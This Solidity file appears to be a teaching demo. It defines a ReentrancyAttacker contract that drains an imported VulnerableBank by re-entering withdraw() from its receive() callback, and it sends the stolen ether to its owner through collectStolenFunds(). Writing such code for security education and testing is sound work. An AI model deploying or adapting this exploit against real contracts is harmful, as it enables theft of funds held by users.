// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title ReentrancyAttacker
 * @notice 演示针对 VulnerableBank 的重入攻击
 * @dev 教育目的：展示如何利用重入漏洞
 *
 * 攻击流程：
 * 1. 攻击者向 VulnerableBank 存入 1 ETH
 * 2. 调用 attack() 函数开始攻击
 * 3. 调用 VulnerableBank.withdraw()
 * 4. VulnerableBank 向攻击合约转账，触发 receive()
 * 5. receive() 中再次调用 withdraw()（重入！）
 * 6. 重复步骤 4-5，直到银行余额耗尽
 */
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    uint256 public attackCount;

    event AttackStarted(address attacker);
    event ReentrancyExecuted(uint256 count, uint256 balance);
    event AttackCompleted(uint256 totalStolen);

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    /**
     * @notice 开始攻击
     * @dev 需要先向此合约发送 ETH 作为初始存款
     */
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackCount = 0;
        emit AttackStarted(msg.sender);

        // 步骤 1: 向目标银行存款
        vulnerableBank.deposit{value: msg.value}();

        // 步骤 2: 触发第一次提款（将引发重入循环）
        vulnerableBank.withdraw();

        emit AttackCompleted(address(this).balance);
    }

    /**
     * @notice 接收 ETH 的回调函数
     * @dev 这是重入攻击的核心：每次收到转账就再次提款
     */
    receive() external payable {
        attackCount++;
        emit ReentrancyExecuted(attackCount, address(vulnerableBank).balance);

        // 如果银行还有余额，继续重入攻击
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }

    /**
     * @notice 提取盗取的资金（仅限所有者）
     */
    function collectStolenFunds() external {
        require(msg.sender == owner, "Only owner can collect");
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    /**
     * @notice 查询攻击合约余额
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice 查询目标银行余额
     */
    function getBankBalance() public view returns (uint256) {
        return address(vulnerableBank).balance;
    }
}
